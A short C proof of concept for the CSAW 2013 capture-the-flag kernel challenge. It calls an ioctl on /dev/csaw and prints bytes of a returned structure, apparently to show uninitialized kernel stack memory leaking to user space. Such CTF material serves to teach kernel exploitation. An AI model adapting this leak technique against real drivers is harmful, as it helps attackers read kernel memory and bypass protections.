/*
 * CSAW 2013 Michael Coppola leak uninitialized kstack
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/utsname.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_GET_STATS      CSAW_IOCTL_BASE+7

struct csaw_stats {
    unsigned long clients;
    unsigned long handles;
    unsigned long bytes_read;
    unsigned long bytes_written;
    char version[40];
};

int main ( int argc, char **argv )
{
    int fd, ret, i;
    struct csaw_stats csaw_stats;

    fd = open("/dev/csaw", O_RDONLY);
    if ( fd < 0 )
    {
        perror("open");
        exit(EXIT_FAILURE);
    }

    memset(&csaw_stats, 0, sizeof(csaw_stats));

    ret = ioctl(fd, CSAW_GET_STATS, &csaw_stats);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    for ( i = 0; i < 20; i++ )
        printf("%02hhx ", csaw_stats.version[20+i]);
    printf("\n");

    return 0;
}
